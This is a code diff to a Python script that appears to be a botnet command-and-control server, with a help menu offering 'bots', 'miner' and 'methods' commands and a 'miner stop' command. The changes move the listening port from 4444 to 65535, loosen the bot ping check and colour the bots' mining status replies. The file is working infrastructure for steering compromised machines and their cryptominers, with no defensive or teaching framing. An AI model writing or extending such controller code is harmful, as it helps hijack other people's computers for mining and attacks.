@@ -5,7 +5,7 @@ import sys
 import os
 
 host = "127.0.0.1"
-port = 4444
+port = 65535
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -47,7 +47,7 @@ banner = """
 help_menu = """\033[90m
   -/-\033[35m help \033[90m      -/-
   -/-\033[35m bots \033[90m      -/-
-  -/-\033[35m stat   \033[90m    -/-
+  -/-\033[35m stat \033[90m      -/-
   -/-\033[35m clear \033[90m     -/-
   -/-\033[35m miner \033[90m     -/-
   -/-\033[35m methods \033[90m   -/-
@@ -101,9 +101,7 @@ def ping():
             for client in clients:
                 try:
                     client.sendall(b'ping')
-
-                    if client.recv(1024).decode() != "pong":
-                        clients.remove(client)
+                    client.recv(1024)
 
                 except ConnectionError:
                     clients.remove(client)
@@ -170,12 +168,13 @@ def server():
                         for client in clients:
                             client.sendall(console.encode())
 
-                            stat = client.recv(1024).decode()
+                            data = client.recv(1024).decode()
 
-                            if stat == "pong":
-                                pass
-                            else:
-                                print(stat)
+                            if data == "Running":
+                                print("\033[32mRunning\033[0m")
+
+                            elif data == "Not Running":
+                                print("\033[31mNot Running\033[0m")
 
                     # Miner
                     elif console == "miner stop":
